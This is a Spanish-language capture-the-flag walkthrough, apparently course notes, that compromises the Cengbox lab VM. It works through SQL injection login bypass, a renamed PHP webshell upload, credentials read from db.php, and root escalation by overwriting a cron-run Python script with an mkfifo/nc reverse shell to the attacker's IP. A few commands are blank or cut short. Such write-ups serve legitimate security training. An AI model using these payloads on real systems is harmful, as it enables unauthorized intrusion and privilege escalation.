---
title: "🖥️ Máquina: Cengbox — Hacking Ético"
aliases:
  - Cengbox
  - cengbox
  - Máquina Cengbox
  - VM Cengbox
  - Writeup Cengbox
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Cengbox

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** SQLi Authentication Bypass · File Upload (bypass de extensión) · Webshell · Credenciales en config PHP · MySQL · Cron Job Hijacking (Python)  
> **Descripción:** En esta práctica bypasearemos un login con SQL Injection, subiremos una webshell cambiando la extensión del archivo para saltarnos el filtro, leeremos credenciales de base de datos desde un archivo de configuración PHP, accederemos por SSH al usuario del sistema y escalaremos a root envenenando un script Python que se ejecuta periódicamente como root mediante cron.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.10`
* **`RHOST` (Víctima / Cengbox):** Ej. `10.10.0.7`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Cengbox tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -sT -F 10.10.0.7
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
whatweb http://10.10.0.7
```

```text
http://10.10.0.7 [200 OK] Apache[2.4.18], Email[cengover@cengbox.com],
HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], Title[CEng Company]
```

```bash
nikto -h http://10.10.0.7
```

```text
+ Server: Apache/2.4.18 (Ubuntu)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54).
+ /icons/README: Apache default file found.
+ 5 item(s) reported on remote host
```

> [!info] Resultado
> Whatweb revela una dirección de correo cengover@cengbox.com, lo que sugiere el nombre del usuario del sistema. La web va lenta; enumeramos directorios usando el diccionario recomendado por el autor de la VM:

---

## 🌐 Fase 2: Enumeración web

```bash
gobuster dir -u http://10.10.0.7 -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
```

```text
/uploads      (Status: 301) [--> http://10.10.0.7/uploads/]
/masteradmin  (Status: 301) [--> http://10.10.0.7/masteradmin/]
```

```bash
gobuster dir -u http://10.10.0.7/masteradmin -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x html,txt,php
```

```text
/login.php   (Status: 200) [Size: 5137]
/upload.php  (Status: 200) [Size: 1440]
/db.php      (Status: 200) [Size: 0]
```

> [!info] Resultado
> Tres recursos relevantes: un formulario de login, una página de subida de archivos y un db.php que probablemente contenga credenciales de base de datos (tamaño 0 porque PHP no muestra su código al ejecutarse). Empezamos atacando el login.

---

## 💉 Fase 3: SQLi Authentication Bypass

Accedemos al formulario en http://10.10.0.7/masteradmin/login.php y probamos payloads clásicos de bypass de autenticación SQL. El siguiente funciona en ambos campos:

```text
Usuario:  ' OR '1'='1
Password: ' OR '1'='1
```

> [!info] Resultado
> La consulta SQL del login queda como WHERE user='' OR '1'='1' AND pass='' OR '1'='1', que siempre es verdadera. Accedemos al panel de administración donde aparece una página para subir archivos.

---

## 📤 Fase 4: File Upload — bypass de extensión

Descargamos una webshell PHP:

```bash
wget https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php
```

Intentamos subirla directamente y obtenemos un error:

```text
extension not allowed, please choose a CENG file.
```

> [!info] Resultado
> El servidor solo acepta archivos con extensión .ceng. El filtro solo comprueba la extensión del nombre pero no el tipo MIME ni el contenido real del archivo. Renombramos la shell y la subimos:

```bash
mv shell.php shell.ceng
```

> [!info] Resultado
> Subimos shell.ceng desde el formulario web. Aparece el mensaje Success en la parte superior izquierda. Durante la enumeración vimos el directorio /uploads, que es donde se almacenan los archivos subidos. Accedemos:

```bash
http://10.10.0.7/uploads/shell.ceng
```

> [!info] Resultado
> La webshell se ejecuta correctamente. Verificamos que nc está disponible y lanzamos una reverse shell más estable. Dividimos el terminal: en el panel superior ponemos Kali en escucha:

```bash
nc -lnvp 9002
```

Desde la webshell en el navegador ejecutamos:

```bash

```

```text
connect to [10.0.0.10] from (UNKNOWN) [10.10.0.7] ...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🗄️ Fase 5: Credenciales en db.php — acceso a MySQL

Mejoramos la shell antes de continuar:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Buscamos usuarios del sistema:

```bash
cat /etc/passwd | egrep -v "nologin|false|sync"
```

```text
root:x:0:0:root:/root:/bin/bash
cengover:x:1000:1000:cengover,,,:/home/cengover:/bin/bash
```

> [!info] Resultado
> El usuario cengover confirma lo que ya nos sugería el email encontrado con whatweb. Leemos el archivo de configuración de la base de datos:

```bash
cd /var/www/html/masteradmin
```

```bash
cat db.php
```

```text
$serverName = "localhost";
$username   = "root";
$password   = "SuperS3cR3TPassw0rd1!";
$dbName     = "cengbox";
```

> [!info] Resultado
> Credenciales de la base de datos en texto claro. Accedemos a MySQL para extraer más información:

```bash
mysql -u root -p
```

```text
Enter password: SuperS3cR3TPassw0rd1!
```

```bash
show databases;
```

```bash
use cengbox;
```

```bash
show tables;
```

```bash
select * FROM admin;
```

```text
+----+-------------+---------------+
| id | username    | password      |
+----+-------------+---------------+
|  1 | masteradmin | C3ng0v3R00T1! |
+----+-------------+---------------+
```

> [!info] Resultado
> Credencial adicional: masteradmin:C3ng0v3R00T1!. Probamos esta contraseña con el usuario cengover por SSH.

```bash
sqlmap -u
```

---

## 🔑 Fase 6: Acceso SSH como cengover

```bash
ssh cengover@10.10.0.7
```

```text
cengover@10.10.0.7's password: C3ng0v3R00T1!
```

```bash
id
```

```text
uid=1000(cengover) gid=1000(cengover) groups=1000(cengover),4(adm),24(cdrom),30(dip),46(plugdev),100(users),110(lxd),117(lpadmin),118(sambashare)
```

```bash
ls -la
```

```bash
cat user.txt
```

```text
8f7f6471e2e869f029a75c5de601d5e0
```

> [!info] Resultado
> Flag de usuario obtenida: 8f7f6471e2e869f029a75c5de601d5e0

---

## 🚀 Fase 7: Escalada de privilegios — Cron Job Hijacking

Descargamos pspy64s para monitorizar procesos en tiempo real sin necesitar privilegios de root:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
```

```bash
file pspy64s
```

```text
pspy64s: ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

```bash
chmod +x pspy64s
```

```bash
./pspy64s
```

```text
2026/03/15 17:32:01 CMD: UID=0  PID=1764  | /bin/sh -c /usr/bin/python3 /opt/md5check.py
```

> [!info] Resultado
> UID=0 confirma que es root quien ejecuta el script cada minuto. Paramos pspy con CTRL+C y analizamos los permisos del script:

```bash
ls -l /opt/md5check.py
```

```text
-rw-rw---- 1 root users 545 Apr 29  2020 /opt/md5check.py
```

> [!info] Resultado
> El grupo users tiene permisos de lectura y escritura sobre el script. Comprobamos que cengover pertenece a ese grupo:

```bash
id
```

```text
uid=1000(cengover) gid=1000(cengover) groups=1000(cengover),...,100(users),...
```

> [!info] Resultado
> Confirmado: pertenecemos al grupo users y podemos modificar el script. Hacemos una copia de seguridad del original y lo sobreescribimos con una reverse shell Python:

En una nueva terminal de Kali ponemos el listener:

```bash
nc -lnvp 4444
```

De vuelta en la shell de cengover, hacemos copia de seguridad y editamos el script:

```bash
cp /opt/md5check.py ~/md5check.py
```

```bash
nano /opt/md5check.py
```

> [!info] Resultado
> Borramos todo el contenido con CTRL+K línea por línea y escribimos la reverse shell. Guardamos con CTRL+O (Enter) y salimos con CTRL+X:

```text
#!/usr/bin/python
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.10 4444 >/tmp/f")
```

> [!info] Resultado
> Esperamos como máximo un minuto a que cron ejecute el script como root. En el listener de Kali recibimos la conexión:

```text
connect to [10.0.0.10] from (UNKNOWN) [10.10.0.7] 56972
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
ls -la /root
```

```bash
cat /root/root.txt
```

```text
/ ____|  ____|           |  _ \           
| |    | |__   _ __   __ _| |_) | _____  __
| |    |  __| | '_ \ / _` |  _
```

> [!info] Resultado
> Flag de root obtenida: a51e522b22a439b8e1b22d84f71cf0f2

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
